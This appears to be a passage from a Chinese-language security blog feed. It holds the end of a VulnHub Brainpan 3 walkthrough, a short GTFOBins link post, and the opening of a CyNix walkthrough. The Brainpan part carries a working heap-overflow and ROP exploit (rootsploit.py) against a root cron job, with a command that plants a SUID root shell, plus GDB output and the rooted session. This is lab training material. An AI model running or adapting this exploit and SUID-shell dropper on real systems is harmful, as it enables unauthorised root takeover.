<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">puck@brainpan3:/home/puck$ ls -lah /etc/cron.d/</span><br><span class="line">ls -lah /etc/cron.d/</span><br><span class="line">ls -lah /etc/cron.d/</span><br><span class="line">total 16K</span><br><span class="line">drwxr-xr-x  2 root root 4.0K May 20  2015 .</span><br><span class="line">drwxr-xr-x 90 root root 4.0K Feb  6 07:11 ..</span><br><span class="line">-rw-r--r--  1 root root  102 Feb  9  2013 .placeholder</span><br><span class="line">-rw-r--r--  1 root root  100 May 19  2015 msg_admin</span><br><span class="line">puck@brainpan3:/home/puck$ cat /etc/cron.d/msg_admin</span><br><span class="line">cat /etc/cron.d/msg_admin</span><br><span class="line">cat /etc/cron.d/msg_admin</span><br><span class="line">* * * * * root <span class="built_in">cd</span> /opt/.messenger; <span class="keyword">for</span> i <span class="keyword">in</span> *.msg; <span class="keyword">do</span> /usr/<span class="built_in">local</span>/bin/msg_admin 1 <span class="variable">$i</span>; rm -f <span class="variable">$i</span>; <span class="keyword">done</span></span><br><span class="line">puck@brainpan3:/home/puck$ /usr/<span class="built_in">local</span>/bin/msg_admin</span><br><span class="line">/usr/<span class="built_in">local</span>/bin/msg_admin</span><br><span class="line">/usr/<span class="built_in">local</span>/bin/msg_admin</span><br><span class="line">Usage: /usr/<span class="built_in">local</span>/bin/msg_admin priority message.txt</span><br><span class="line">Message file format: requestername|message</span><br><span class="line">Eg: tony|Add a new user to repo</span><br><span class="line">Can have multiple messages <span class="keyword">in</span> a single file separated by newlines.</span><br><span class="line">Eg: tony|Please remove /tmp/foo</span><br><span class="line">    cate|Reset password request.</span><br></pre></td></tr></table></figure>

<p>cron job 从/opt/.messenger文件夹中获取所有.msg文件，并将它们传递给msg_admin可执行文件，然后删除该文件。将可执行文件复制到本地计算机进行分析。</p>
<p>struct_msg</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">struct struct_msg</span><br><span class="line">&#123;</span><br><span class="line">  int Priority;</span><br><span class="line">  char *Requestername;</span><br><span class="line">  char *Msg;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>main</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  void *v3; // esp</span><br><span class="line">  int result; // eax</span><br><span class="line">  int v5; // ebx</span><br><span class="line">  int v6; // ebx</span><br><span class="line">  char *v7; // ebx</span><br><span class="line">  const char *v8; // [esp-18h] [ebp-98h]</span><br><span class="line">  int v9; // [esp-14h] [ebp-94h]</span><br><span class="line">  int v10; // [esp-Ch] [ebp-8Ch]</span><br><span class="line">  const char **v11; // [esp+0h] [ebp-80h]</span><br><span class="line">  int v12; // [esp+4h] [ebp-7Ch]</span><br><span class="line">  char *s; // [esp+Ch] [ebp-74h]</span><br><span class="line">  int v14; // [esp+10h] [ebp-70h]</span><br><span class="line">  int i; // [esp+14h] [ebp-6Ch]</span><br><span class="line">  int v16; // [esp+18h] [ebp-68h]</span><br><span class="line">  int v17; // [esp+1Ch] [ebp-64h]</span><br><span class="line">  int v18; // [esp+20h] [ebp-60h]</span><br><span class="line">  char *dest; // [esp+24h] [ebp-5Ch]</span><br><span class="line">  FILE *stream; // [esp+28h] [ebp-58h]</span><br><span class="line">  void *v21; // [esp+2Ch] [ebp-54h]</span><br><span class="line">  void *v22; // [esp+30h] [ebp-50h]</span><br><span class="line">  char *delim; // [esp+34h] [ebp-4Ch]</span><br><span class="line">  char *src; // [esp+38h] [ebp-48h]</span><br><span class="line">  int v25[10]; // [esp+3Ch] [ebp-44h]</span><br><span class="line">  unsigned int v26; // [esp+64h] [ebp-1Ch]</span><br><span class="line">  int *v27; // [esp+70h] [ebp-10h]</span><br><span class="line"></span><br><span class="line">  v27 = &amp;argc;</span><br><span class="line">  v12 = argc;</span><br><span class="line">  v11 = argv;</span><br><span class="line">  v26 = __readgsdword(0x14u);</span><br><span class="line">  v16 = 0;</span><br><span class="line">  v17 = 10;</span><br><span class="line">  v14 = 0;</span><br><span class="line">  i = 0;</span><br><span class="line">  v18 = 399;</span><br><span class="line">  v3 = alloca(400);</span><br><span class="line">  dest = (char *)&amp;v10;</span><br><span class="line">  <span class="keyword">if</span> ( argc &gt; 2 )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = v11[1];</span><br><span class="line">    v16 = atol(v8);</span><br><span class="line">    stream = fopen(v11[2], <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    s = (char *)malloc(0x190u);</span><br><span class="line">    v21 = malloc(0x14u);</span><br><span class="line">    v22 = malloc(0x64u);</span><br><span class="line">    <span class="keyword">while</span> ( getline((int)&amp;s, (int)&amp;LINEMAX_2, (int)stream) &gt; 0 )</span><br><span class="line">      ++v14;</span><br><span class="line">    v9 = v14;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Recording %d entries\n&quot;</span>, v14);</span><br><span class="line">    rewind(stream);</span><br><span class="line">    <span class="keyword">for</span> ( i = 0; i &lt; v14; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v25[i] = (int)malloc(0xCu);</span><br><span class="line">      *(_DWORD *)v25[i] = v16;</span><br><span class="line">      v5 = v25[i];</span><br><span class="line">      *(_DWORD *)(v5 + 4) = malloc(0xAu);</span><br><span class="line">      v6 = v25[i];</span><br><span class="line">      *(_DWORD *)(v6 + 8) = malloc(0xC8u);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = 0; i &lt; v14; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      delim = <span class="string">&quot;|&quot;</span>;</span><br><span class="line">      <span class="keyword">if</span> ( getline((int)&amp;s, (int)&amp;LINEMAX_2, (int)stream) &gt; 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        v7 = s;</span><br><span class="line">        v7[strlen(s) - 1] = 0;</span><br><span class="line">        src = strtok(s, delim);</span><br><span class="line">        strcpy(*(char **)(v25[i] + 4), src);</span><br><span class="line">        src = strtok(0, delim);</span><br><span class="line">        strcpy(*(char **)(v25[i] + 8), src);</span><br><span class="line">        strncpy(dest, *(const char **)(v25[i] + 8), 0x64u);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(stream);</span><br><span class="line">    notify_admin((int)v25, v14);</span><br><span class="line">    result = 0;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    usage((int)*v11);</span><br><span class="line">    result = 1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这是经典的内存损坏。对于.msg文件中的每条消息（行），它都会创建一个struct_msg结构并为其变量分配内存，然后将其添加到列表中。接下来，它循环遍历文件，并在“ |”定界符上分割每一行，并将每个部分复制到结构变量“Requestername”和“Msg”。这些变量的固定大小为10（请求者名称）和200（消息）。由于没有检查长度，因此可能破坏内存中的结构指针。以下代码创建一个包含2条消息的.msg文件，每个文件的变量都填充到其最大值，因此不会破坏任何内容。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">import struct</span><br><span class="line"> </span><br><span class="line"><span class="comment"># message 1</span></span><br><span class="line">payload =  10  * <span class="string">&#x27;\x41&#x27;</span> <span class="comment"># A</span></span><br><span class="line">payload += <span class="string">&#x27;|&#x27;</span></span><br><span class="line">payload += 200 * <span class="string">&#x27;\x42&#x27;</span> <span class="comment"># B</span></span><br><span class="line">payload += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"><span class="comment"># message 2</span></span><br><span class="line">payload += 10  * <span class="string">&#x27;\x43&#x27;</span> <span class="comment"># C</span></span><br><span class="line">payload += <span class="string">&#x27;|&#x27;</span></span><br><span class="line">payload += 200 * <span class="string">&#x27;\x44&#x27;</span> <span class="comment"># D</span></span><br><span class="line">payload += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"> </span><br><span class="line">open(<span class="string">&#x27;poc.msg&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(payload)</span><br></pre></td></tr></table></figure>

<p>当使用GDB分析内存时，可以看到如何映射所有内存</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0x804c388:    0x00000001    0x0804c398    0x0804c3a8    0x00000011</span><br><span class="line">0x804c398:    0x41414141    0x41414141    0x00004141    0x000000d1</span><br><span class="line">0x804c3a8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c3b8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c3c8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c3d8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c3e8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c3f8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c408:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c418:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c428:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c438:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c448:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c458:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c468:    0x42424242    0x42424242    0x00000000    0x00000011</span><br><span class="line">0x804c478:    0x00000001    0x0804c488    0x0804c498    0x00000011</span><br><span class="line">0x804c488:    0x43434343    0x43434343    0x00004343    0x000000d1</span><br><span class="line">0x804c498:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c4a8:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c4b8:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c4c8:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c4d8:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c4e8:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c4f8:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c508:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c518:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c528:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c538:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c548:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c558:    0x44444444    0x44444444    0x00000000    0x00020aa1</span><br></pre></td></tr></table></figure>

<p>第一个struct_msg结构位于0x804c388，第二个位于0x804c478。现在，在第一个消息中使用较大的（216字节）“Msg”缓冲区时，将覆盖第二个struct_msg结构的“Requestername”指针，并在下一个strcpy调用中有效控制目标指针和源数据，从而导致Write-允许我们修补GOT条目的任何条件。这段代码将got.strtok地址修补为0x43434343，strtok是strcpy之后执行的下一个函数。我编写了一个ROP有效负载，它通过从3个阶段中添加0xE900来将取自atol的atol的地址加载到eax中，并将该值累加至系统，然后使用参数’/ tmp / foo’调用eax（system），这是一个脚本由我们创建并在执行时将根拥有的SUID shell复制到tmp。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">import struct</span><br><span class="line"> </span><br><span class="line"><span class="comment"># message 1</span></span><br><span class="line"><span class="comment"># .got.plt:0804B05C off_804B05C     dd offset strtok        ; DATA XREF: _strtok</span></span><br><span class="line">payload = 10 * <span class="string">&#x27;\x41&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;|&#x27;</span></span><br><span class="line">payload += 200 * <span class="string">&#x27;\x42&#x27;</span></span><br><span class="line">payload += 12 * <span class="string">&#x27;\x42&#x27;</span></span><br><span class="line"><span class="comment"># overwrite 2nd struct it&#x27;s requestername pointer</span></span><br><span class="line">payload += p(0x0804B05C) <span class="comment"># strtok GOT, becomes 0x43434343</span></span><br><span class="line">payload += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"><span class="comment"># message 2</span></span><br><span class="line">payload += 4 * <span class="string">&#x27;\x43&#x27;</span> <span class="comment"># written to got.strtok</span></span><br><span class="line">payload += <span class="string">&#x27;|&#x27;</span></span><br><span class="line">payload += 200 * <span class="string">&#x27;\x44&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"> </span><br><span class="line">open(<span class="string">&#x27;poc.msg&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(payload)</span><br></pre></td></tr></table></figure>

<p>一些GDB</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/150xw 0x804c388</span><br><span class="line">0x804c388:    0x00000001    0x0804c398    0x0804c3a8    0x00000011</span><br><span class="line">0x804c398:    0x41414141    0x41414141    0x00004141    0x000000d1</span><br><span class="line">0x804c3a8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c3b8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c3c8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c3d8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c3e8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c3f8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c408:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c418:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c428:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c438:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c448:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c458:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c468:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c478:    0x42424242    0x0804b05c    0x0804c400    0x00000011</span><br><span class="line">0x804c488:    0x00000000    0x00000000    0x00000000    0x000000d1</span><br><span class="line">0x804c498:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c4a8:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c4b8:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c4c8:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c4d8:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c4e8:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c4f8:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c508:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c518:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c528:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c538:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c548:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c558:    0x00000000    0x00000000    0x00000000    0x00020aa1</span><br><span class="line">...</span><br><span class="line">Invalid <span class="variable">$PC</span> address: 0x43434343</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xbffff2ac --&gt; 0x8048ce3 (:    mov    DWORD PTR [ebp-0x48],eax)</span><br><span class="line">0004| 0xbffff2b0 --&gt; 0x0 </span><br><span class="line">0008| 0xbffff2b4 --&gt; 0x8048f4d --&gt; 0x100007c </span><br><span class="line">0012| 0xbffff2b8 --&gt; 0x804c008 --&gt; 0xfbad2488 </span><br><span class="line">0016| 0xbffff2bc (<span class="string">&#x27;B&#x27;</span> repeats 100 <span class="built_in">times</span> <span class="string">&quot;\234, \357\377\267 \360\377\267&quot;</span>)</span><br><span class="line">0020| 0xbffff2c0 (<span class="string">&#x27;B&#x27;</span> repeats 96 <span class="built_in">times</span> <span class="string">&quot;\234, \357\377\267 \360\377\267&quot;</span>)</span><br><span class="line">0024| 0xbffff2c4 (<span class="string">&#x27;B&#x27;</span> repeats 92 <span class="built_in">times</span> <span class="string">&quot;\234, \357\377\267 \360\377\267&quot;</span>)</span><br><span class="line">0028| 0xbffff2c8 (<span class="string">&#x27;B&#x27;</span> repeats 88 <span class="built_in">times</span> <span class="string">&quot;\234, \357\377\267 \360\377\267&quot;</span>)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x43434343 <span class="keyword">in</span> ?? ()</span><br></pre></td></tr></table></figure>

<p>基于GDB的输出，可以看到，如果执行pop（4）小工具，将返回第一条（上一条）消息的“目标”数据，该消息由“strncpy（dest，aMessages [i]”存储在堆栈中]-&gt; Msg，100u）;’。</p>
<h4 id="root所有的一切"><a href="#root所有的一切" class="headerlink" title="root所有的一切"></a>root所有的一切</h4><p>编写了一个ROP payload，通过从3个阶段中添加0xE900来将取自atol的atol的地址加载到eax中，并将该值累加至系统，然后使用参数’/tmp/foo’调用eax（system），这是一个脚本由我创建并在执行时将root拥有的SUID shell复制到tmp。</p>
<p>rootsploit.py</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">import struct</span><br><span class="line">import os</span><br><span class="line"> </span><br><span class="line">def p(v):</span><br><span class="line">    <span class="built_in">return</span> struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, v)</span><br><span class="line"> </span><br><span class="line">__strtok_got    = 0x0804B05C</span><br><span class="line">__atol_got      = 0x0804B04C</span><br><span class="line">__ppppr         = 0x08048DDC</span><br><span class="line">__foo_str       = 0x08048ED8</span><br><span class="line">__int16_e800h   = 0x080480C7</span><br><span class="line">__int16_0100h   = 0x08048093</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">rop  = p(0x08048790)</span><br><span class="line">rop += p(0x08048E06)</span><br><span class="line">rop += p((__atol_got - 0x01270304) &amp; 0xFFFFFFFF)</span><br><span class="line">rop += p(0x08048FEB)</span><br><span class="line">rop += p(0x08048E06)</span><br><span class="line">rop += p((__int16_e800h - 0x01270304) &amp; 0xFFFFFFFF)</span><br><span class="line">rop += p(0x08048FEB)</span><br><span class="line">rop += p(0x08048E06)</span><br><span class="line">rop += p((__int16_0100h - 0x01270304) &amp; 0xFFFFFFFF)</span><br><span class="line">rop += p(0x08048FEB)</span><br><span class="line">rop += p(0x08048786)</span><br><span class="line">rop += p(__foo_str + 23)</span><br><span class="line"> </span><br><span class="line">payload = 10 * <span class="string">&#x27;A&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;|&#x27;</span></span><br><span class="line">payload += rop.ljust(212, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># padding till 212 eq next struct requestername pointer</span></span><br><span class="line">payload += p(0x0804B05C) <span class="comment"># strtok GOT, becomes __ppppr</span></span><br><span class="line">payload += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">payload += p(__ppppr) <span class="comment"># written to got.strtok</span></span><br><span class="line">payload += <span class="string">&#x27;|&#x27;</span></span><br><span class="line">payload += 200 * <span class="string">&#x27;A&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"> </span><br><span class="line">open(<span class="string">&#x27;exploit.msg&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(payload)</span><br><span class="line">foocode = <span class="string">&quot;cp /bin/sh /tmp/r00tsh3ll;chown root:root /tmp/r00tsh3ll;chmod 4755 /tmp/r00tsh3ll&quot;</span></span><br><span class="line">open(<span class="string">&#x27;/tmp/foo&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(foocode)</span><br><span class="line">os.system(<span class="string">&#x27;chmod +x /tmp/foo&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>从tmp文件夹执行漏洞利用脚本，并将创建的exploit.msg移至/opt/.messenger文件夹，然后稍等。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">puck@brainpan3:/tmp$ python rootsploit.py</span><br><span class="line">python rootsploit.py</span><br><span class="line">python rootsploit.py</span><br><span class="line">puck@brainpan3:/tmp$ ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">total 20K</span><br><span class="line">drwxrwxrwt  2 root   root   4.0K Feb  6 13:03 .</span><br><span class="line">drwxr-xr-x 21 root   root   4.0K Jun 17  2015 ..</span><br><span class="line">-rw-r--r--  1 puck   dev     434 Feb  6 13:03 exploit.msg</span><br><span class="line">-rwxr-xr-x  1 puck   dev      82 Feb  6 13:03 foo</span><br><span class="line">-rwxrwxrwx  1 anansi webdev 1.1K Feb  6 12:59 rootsploit.py</span><br><span class="line">puck@brainpan3:/tmp$ mv exploit.msg /opt/.messenger/</span><br><span class="line">mv exploit.msg /opt/.messenger/</span><br><span class="line">mv exploit.msg /opt/.messenger/</span><br><span class="line">puck@brainpan3:/tmp$ ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">total 16K</span><br><span class="line">drwxrwxrwt  2 root   root   4.0K Feb  6 13:03 .</span><br><span class="line">drwxr-xr-x 21 root   root   4.0K Jun 17  2015 ..</span><br><span class="line">-rwxr-xr-x  1 puck   dev      82 Feb  6 13:03 foo</span><br><span class="line">-rwxrwxrwx  1 anansi webdev 1.1K Feb  6 12:59 rootsploit.py</span><br><span class="line">puck@brainpan3:/tmp$ ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">total 16K</span><br><span class="line">drwxrwxrwt  2 root   root   4.0K Feb  6 13:03 .</span><br><span class="line">drwxr-xr-x 21 root   root   4.0K Jun 17  2015 ..</span><br><span class="line">-rwxr-xr-x  1 puck   dev      82 Feb  6 13:03 foo</span><br><span class="line">-rwxrwxrwx  1 anansi webdev 1.1K Feb  6 12:59 rootsploit.py</span><br><span class="line">puck@brainpan3:/tmp$ ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">total 128K</span><br><span class="line">drwxrwxrwt  2 root   root   4.0K Feb  6 13:04 .</span><br><span class="line">drwxr-xr-x 21 root   root   4.0K Jun 17  2015 ..</span><br><span class="line">-rwxr-xr-x  1 puck   dev      82 Feb  6 13:03 foo</span><br><span class="line">-rwsr-xr-x  1 root   root   110K Feb  6 13:04 r00tsh3ll</span><br><span class="line">-rwxrwxrwx  1 anansi webdev 1.1K Feb  6 12:59 rootsploit.py</span><br><span class="line">puck@brainpan3:/tmp$ ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">total 128K</span><br><span class="line">drwxrwxrwt  2 root   root   4.0K Feb  6 13:04 .</span><br><span class="line">drwxr-xr-x 21 root   root   4.0K Jun 17  2015 ..</span><br><span class="line">-rwxr-xr-x  1 puck   dev      82 Feb  6 13:03 foo</span><br><span class="line">-rwsr-xr-x  1 root   root   110K Feb  6 13:04 r00tsh3ll</span><br><span class="line">-rwxrwxrwx  1 anansi webdev 1.1K Feb  6 12:59 rootsploit.py</span><br><span class="line">puck@brainpan3:/tmp$ ./r00tsh3ll</span><br><span class="line">./r00tsh3ll</span><br><span class="line">./r00tsh3ll</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">id</span><br><span class="line">uid=1001(puck) gid=1004(dev) euid=0(root) groups=0(root)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">whoami</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">ls</span><br><span class="line">brainpan.8.gz</span><br><span class="line"><span class="comment"># ls -la</span></span><br><span class="line">ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 20</span><br><span class="line">drwx------  2 root root 4096 Jul 16  2015 .</span><br><span class="line">drwxr-xr-x 21 root root 4096 Jun 17  2015 ..</span><br><span class="line">-rw-------  1 root root    0 Jul 16  2015 .bash_history</span><br><span class="line">-rw-------  1 root root 3106 Feb 19  2014 .bashrc</span><br><span class="line">-rw-------  1 root root  140 May 31  2015 .profile</span><br><span class="line">-rw-------  1 root root  314 Jun 23  2015 brainpan.8.gz</span><br></pre></td></tr></table></figure>

<p>成功的取得了root权限</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub205.jpg"></p>
<p>将其中的brainpan.8.gz复制到/home/anansi文件夹，然后开启python的SimpleHTTPServer，将brainpan.8.gz下载之后解压，读取其中的内容，发现如下所示的文本，正好是flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3<span class="comment"># file brainpan.8 </span></span><br><span class="line">brainpan.8: troff or preprocessor input, ASCII text</span><br><span class="line">root@kali:~/vulnhub/brainpan3<span class="comment"># cat brainpan.8 </span></span><br><span class="line">.TH man 8 <span class="string">&quot;20 May 2015&quot;</span> <span class="string">&quot;3.0&quot;</span> <span class="string">&quot;brainpan 3&quot;</span></span><br><span class="line"></span><br><span class="line">.SH DESCRIPTION</span><br><span class="line">Congratulations, you win! Thanks <span class="keyword">for</span> playing!</span><br><span class="line"></span><br><span class="line">.SH FLAG</span><br><span class="line">.B</span><br><span class="line">flag&#123;tricksy-hobbitses-use-unix&#125;</span><br><span class="line"></span><br><span class="line">.SH BUGS</span><br><span class="line">You found them all. </span><br><span class="line"></span><br><span class="line">.SH AUTHOR</span><br><span class="line">superkojiman - </span><br><span class="line">.B</span><br><span class="line">http://blog.techorganic.com</span><br><span class="line"></span><br><span class="line">.SH TESTERS</span><br><span class="line">Special thanks go to barrebas and Swappage taking the time to <span class="built_in">test</span> Brainpan 3!</span><br><span class="line">.br</span><br><span class="line">barrebas - </span><br><span class="line">.B</span><br><span class="line">https://twitter.com/barrebas</span><br><span class="line">.br</span><br><span class="line">Swappage - </span><br><span class="line">.B</span><br><span class="line">https://twitter.com/Swappage</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub206.jpg"></p>
<h4 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h4><ul>
<li>缓冲区溢出</li>
<li>堆栈溢出</li>
<li>字符串格式漏洞</li>
<li>反引号命令注入</li>
<li><blockquote>
<p>&amp;2管道命令输出</p>
</blockquote>
</li>
<li>python的pwntools模块使用编写poc</li>
<li>pwndbg调试shellcode</li>
<li>ROPGadget找到清晰的eax小工具</li>
<li>偏移量累积寻找</li>
</ul>
<p><font color="red">Game over</font></p>
<p>这次傻瓜式一键通关脚本就在方法一的尾部，enjoy it …</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>linux权限提升检索大全</title>
    <url>/2019/12/03/Elevation-of-authority/</url>
    <content><![CDATA[<p>这个项目也是AlessandroZ大佬的，学习学习，写博客以便查阅。</p>
<p><font color="green">GTFOBins是一个精选的Unix二进制列表，攻击者可以利用它来绕过本地安全限制。</p>
<p>该项目收集了Unix二进制文件的合法功能，这些合法功能可被滥用来破坏受限制的shell，升级或维护提升的特权，传输文件，生成绑定和反向shell，以及促进其他开发后任务。 请参阅功能的完整列表。</font></p>
<a id="more"></a>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Elevation-of-authority.jpeg"></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8v">GTFOBins提权检索地址<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>linux提权</category>
      </categories>
      <tags>
        <tag>Elevation of authority</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub-walkthrough[CyNix-1]</title>
    <url>/2020/05/20/cynix/</url>
    <content><![CDATA[<h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><p><font color="red">为了帮助自己更好的成长，适应国际潮流与发展。从这篇文章开始，本人以后所有的技术文章，walkthrough,writeup,及其他乱七八糟的东西，全部用英文，重要的事情强调3遍,全部用英文!全部用英文!全部用英文!以后为适应国际潮流，文章将不定期换用其它国家的语言！！！</font></p>
<h3 id="name"><a href="#name" class="headerlink" title="name"></a>name</h3><p>Name: CyNix: 1<br>Date release: 18 Nov 2019</p>
